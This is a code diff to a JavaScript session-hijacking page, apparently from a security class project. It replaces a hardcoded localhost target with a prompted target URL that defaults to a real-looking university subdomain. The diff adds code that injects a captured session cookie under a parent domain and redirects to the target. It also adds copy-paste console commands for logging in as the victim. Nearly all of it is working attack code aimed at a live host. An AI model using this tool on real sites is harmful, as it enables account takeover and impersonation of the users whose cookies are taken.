@@ -225,6 +225,13 @@
         sessionCookie = cookieText;
       }
       
+      // Prompt user for target URL
+      const targetURL = prompt('🎯 Enter target server URL:', 'https://project-1-16.eduhk.hk');
+      if (!targetURL) {
+        alert('❌ Cancelled!');
+        return;
+      }
+      
       const hijackWindow = window.open('', '_blank');
       hijackWindow.document.write(`
         <!DOCTYPE html>
@@ -308,10 +315,10 @@
               <div class="step">
                 <strong>Manual Method:</strong><br>
                 1. Copy this command:<br>
-                <pre id="command">document.cookie = "${sessionCookie}; path=/"; location.href = "http://localhost:3000";</pre>
+                <pre id="command">document.cookie = "${sessionCookie}; path=/"; location.href = "${targetURL}";</pre>
                 <button onclick="copyCommand()" style="padding: 5px 15px; font-size: 0.9rem;">📋 Copy Command</button>
                 <br><br>
-                2. Open <a href="http://localhost:3000" target="_blank" style="color: #00ff00;">http://localhost:3000</a> in incognito<br>
+                2. Open <a href="${targetURL}" target="_blank" style="color: #00ff00;">${targetURL}</a> in incognito<br>
                 3. Press F12 → Console → Paste the command → Enter<br>
                 4. You're logged in! 🎯
               </div>
@@ -320,11 +327,35 @@
           
           <script>
             const sessionCookie = \`${sessionCookie}\`;
+            const targetURL = \`${targetURL}\`;
             
             function autoHijack() {
-              document.cookie = sessionCookie + "; path=/";
-              alert('✅ Cookie injected!\\n\\nRedirecting to vulnerable app...');
-              window.location.href = 'http://localhost:3000';
+              // Extract domain from target URL for cookie setting
+              let domain = '';
+              try {
+                const url = new URL(targetURL);
+                domain = url.hostname;
+                // For subdomains like project-1-16.eduhk.hk, we might need .eduhk.hk
+                if (domain.includes('.')) {
+                  const parts = domain.split('.');
+                  if (parts.length >= 2) {
+                    // Use the last two parts for domain (e.g., .eduhk.hk)
+                    domain = '.' + parts.slice(-2).join('.');
+                  }
+                }
+              } catch (e) {
+                console.error('Failed to parse URL:', e);
+              }
+              
+              // Set cookie with proper domain
+              if (domain) {
+                document.cookie = sessionCookie + "; path=/; domain=" + domain;
+              } else {
+                document.cookie = sessionCookie + "; path=/";
+              }
+              
+              alert('✅ Cookie injected!\\n\\nDomain: ' + (domain || 'current') + '\\nRedirecting to: ' + targetURL);
+              window.location.href = targetURL;
             }
             
             function manualInstructions() {
@@ -332,9 +363,9 @@
             }
             
             function copyCommand() {
-              const command = document.getElementById('command').textContent;
+              const command = "document.cookie = \\"" + sessionCookie + "; path=/\\"; location.href = \\'" + targetURL + "\\';";
               navigator.clipboard.writeText(command).then(() => {
-                alert('✅ Command copied!\\n\\nNow:\\n1. Open http://localhost:3000 (incognito)\\n2. F12 → Console\\n3. Paste & Enter');
+                alert('✅ Command copied!\\n\\nNow:\\n1. Open ' + targetURL + ' (incognito)\\n2. F12 → Console\\n3. Paste & Enter');
               });
             }
           <\/script>
